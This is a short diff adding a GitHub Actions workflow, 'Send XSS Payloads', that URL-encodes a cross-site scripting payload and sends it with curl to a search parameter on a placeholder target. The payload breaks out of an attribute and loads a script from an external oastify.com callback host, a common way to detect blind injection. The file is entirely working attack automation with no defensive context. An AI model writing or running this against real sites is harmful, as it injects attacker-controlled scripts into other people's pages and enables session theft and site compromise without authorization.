@@ -1,0 +1,16 @@
+name: Send XSS Payloads
+
+on:
+  workflow_dispatch:  # manual trigger
+
+jobs:
+  send-payload:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Send XSS payload via curl
+        run: |
+          PAYLOAD="\"><script src='https://4tyj2iha062ybwrh51nurns8dzjq7h95y.oastify.com'></script>"
+          TARGET_URL="https://your-vulnerable-site.com/search?q="
+          FULL_URL="${TARGET_URL}$(echo $PAYLOAD | jq -sRr @uri)"
+          curl -s "$FULL_URL" -o /dev/null
